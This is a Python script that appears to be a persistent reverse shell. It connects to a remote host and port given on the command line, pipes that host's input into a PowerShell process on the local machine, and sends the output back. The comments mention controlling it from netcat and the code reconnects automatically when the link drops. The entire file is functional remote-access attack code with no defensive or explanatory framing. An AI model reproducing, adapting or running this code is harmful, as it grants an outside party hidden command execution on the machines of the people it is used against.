import os
import sys
import shutil
import subprocess
import socket
import threading
import time

HOST = None
PORT = None

for i in range(1, len(sys.argv), 2):
    if sys.argv[i] == "-host":
        HOST = sys.argv[i + 1]
    elif sys.argv[i] == "-port":
        PORT = int(sys.argv[i + 1])

def s2p(s, p): # recieve Host commands and send them to the powershell
    while True:
        try:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
        except Exception as e:
            print("Error sending data:", e)
            return

def p2s(s, p): # Send the Host the output of the powershell shell
    while True:
        try:
            s.send(p.stdout.read(1))
        except Exception as e:
            print("Error receiving data:", e)
            return
        

def establish_connection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))  # connect to the forwarded bridge
        print("Connected to Bridge")
        resp = s.recv(1024).decode() # Test to see if it can receive anything from the actual Host

        if resp == '': #If the Host doesnt give some kind of signal (or in this case just hasent typed/pressed enter in netcat) then its offline
            print("Host is offline.. Retrying... ")
            time.sleep(2)
            return establish_connection() # After 2 seconds it will retry to establish the Bridge AND Host

        else:
            print("Host & Bridge Are connected")
            return s # Return that Host and Bridge connection was a sucess
    
    except Exception as e:
        print("Error Bridge Offline:", e)
        return None

def Start_Thread():
    while True:
        try:
            s = establish_connection() # Get the Bridge And Host connection first
            if s: # if the connection is secured continue to the reverse shell
                p = subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()

                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()

                p.wait()
                s.close()
        except Exception as e:
            print("An error occurred:", e)

        print("Retrying...")
        time.sleep(2)  # Wait for 2 seconds before retrying (this error happens normally when i exit the connection) It just reconnects

Start_Thread()
